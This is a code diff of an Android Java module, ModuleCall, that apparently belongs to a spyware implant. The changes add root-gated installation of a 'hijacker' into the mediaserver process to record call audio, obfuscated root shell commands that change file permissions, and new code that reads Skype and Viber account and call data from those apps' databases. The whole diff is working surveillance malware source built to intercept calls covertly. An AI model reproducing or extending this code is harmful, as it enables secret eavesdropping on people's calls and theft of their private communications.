@@ -136,36 +136,33 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 			}
 		}
 
-		// Try to create the audio storage, at this point the sdcard might take
-		// a while to come up
-		boolean audioStorageOk = false;
-
-		for (int i = 0; i < 5; i++) {
-			if (AudioEncoder.createAudioStorage() == true) {
-				audioStorageOk = true;
-				break;
+		if (Status.haveRoot()) {
+			
+			if(android.os.Build.VERSION.SDK_INT < 15 || android.os.Build.VERSION.SDK_INT > 17 ){
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (actualStart): OS level not supported");
+				}
+				return;
 			}
+			
+			AudioEncoder.deleteAudioStorage();
+			boolean audioStorageOk = AudioEncoder.createAudioStorage();
 
-			if (Cfg.DEBUG) {
-				Check.log(TAG + "(actualStart): retrying to create the audio storage");
-			}
+			if (audioStorageOk) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + "(actualStart): starting audio storage management");
+					Execute.execute(new String[] { "touch", "/sdcard/1" });
+					Execute.executeRoot("touch /sdcard/2");
+				}
 
-			Utils.sleep(1000);
-		}
+				if (installHijack()) {
+					startWatchAudio();
+				}
+			} else {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + "(actualStart): unable to create audio storage");
+				}
 
-		if (audioStorageOk == false) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + "(actualStart): unable to create audio storage");
-			}
-		}
-
-		if (Status.haveRoot() && audioStorageOk) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + "(actualStart): starting audio storage management");
-			}
-
-			if (installHijack()) {
-				startWatchAudio();
 			}
 		}
 	}
@@ -230,12 +227,11 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 
 		hijack = new Instrument(M.e("mediaserver"), AudioEncoder.getAudioStorage());
 
-		if (hijack.installHijacker()) {
+		if (hijack.startInstrumentation()) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + "(actualStart): hijacker successfully installed");
 			}
 
-			hijack.startInstrumentation();
 		} else {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + "(actualStart): hijacker cannot be installed");
@@ -277,7 +273,8 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 				}
 
 				// Make it read-write
-				Execute.execute(Configuration.shellFile + " " + M.e("pzm 666") + " " + fullName);
+
+				Execute.execute(Configuration.shellFile + " " + M.e("pzm 666 ") + fullName);
 
 				storedFile.delete();
 			}
@@ -310,7 +307,10 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 	}
 
 	synchronized private boolean addToEncodingList(String s) {
-		if (s.contains(M.e("Qi-")) == false || (s.endsWith(M.e("-l.tmp")) == false && s.endsWith(M.e("-r.tmp")) == false)) {
+
+		if (s.contains(M.e("Qi-")) == false
+				|| (s.endsWith(M.e("-l.tmp")) == false && s.endsWith(M.e("-r.tmp")) == false)) {
+
 			if (Cfg.DEBUG) {
 				Check.log(TAG + "(addToEncodingList): " + s + " is not intended for us");
 			}
@@ -325,7 +325,8 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		hjcb.trigger(s);
 
 		// Make it read-write in any case
-		Execute.execute(Configuration.shellFile + " " + M.e("pzm 666") + " " + s);
+		Execute.execute(Configuration.shellFile + " " + M.e("pzm 666 ") + s);
+
 
 		// Add the file to the list
 		calls.add(s);
@@ -404,6 +405,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 			Check.log(TAG + " (saveCallEvidence): " +
 			" peer: " + peer + " from: " + dateBegin
 			+ " to: " + dateEnd + " incoming: " + incoming);
+
 		}
 
 		final byte[] additionaldata = getCallAdditionalData(peer, myNumber, incoming, new DateTime(dateBegin),
@@ -632,15 +634,19 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		}
 
 		// Decide heuristics logic
+
 		boolean heuristic = true;
 
 		if (!callInfo.heuristic && remote) { // Skype
+
 			if (Cfg.DEBUG) {
 				Check.log(TAG
 						+ "(encodeChunks): Skype call in progress, applying bitrate heuristics on remote channel only");
 			}
 
+
 			heuristic = false;
+
 		}
 
 		if (audioEncoder.encodetoAmr(encodedFile, audioEncoder.resample(heuristic))) {
@@ -783,8 +789,70 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		closeCallEvidence(caller, callee, true, begin, end, callInfo.programId);
 	}
 
+
+	private boolean updateCallInfo(CallInfo callInfo, boolean end) {
+
+		// RunningAppProcessInfo fore = runningProcesses.getForeground();
+		if (callInfo.valid) {
+			return true;
+		}
+
+		ListenerProcess lp = ListenerProcess.self();
+
+		if (lp.isRunning(M.e("com.skype.raider"))) {
+			if (end) {
+				return true;
+			}
+			callInfo.processName = M.e("com.skype.raider");
+			// open DB
+			String account = ChatSkype.readAccount();
+			callInfo.account = account;
+			callInfo.programId = 0x0146;
+			callInfo.delay = false;
+			callInfo.heuristic = false;
+
+			GenericSqliteHelper helper = ChatSkype.openSkypeDBHelper(account);
+
+			boolean ret = false;
+			if (helper != null) {
+				ret = ChatSkype.getCurrentCall(helper, callInfo);
+			}
+
+			return ret;
+		} else if (lp.isRunning(M.e("com.viber.voip"))) {
+			boolean ret = false;
+			callInfo.processName = M.e("com.viber.voip");
+			callInfo.delay = true;
+			callInfo.heuristic = true;
+
+			// open DB
+			callInfo.programId = 0x0148;
+			if (end) {
+				String account = ChatViber.readAccount();
+				callInfo.account = account;
+				GenericSqliteHelper helper = ChatViber.openViberDBHelperCall();
+
+				if (helper != null) {
+					ret = ChatViber.getCurrentCall(helper, callInfo);
+				}
+
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (updateCallInfo) id: " + callInfo.id);
+				}
+			} else {
+				callInfo.account = M.e("delay");
+				callInfo.peer = M.e("delay");
+				ret = true;
+			}
+
+			return ret;
+
+		}
+		return false;
+	}
+
 	public class HijackCallBack implements ICallBack {
-		private static final String TAG = "InternalCallBack";
+		private static final String TAG = "HijackCallBack";
 
 		public <O> void run(O o) {
 			if (Cfg.DEBUG) {
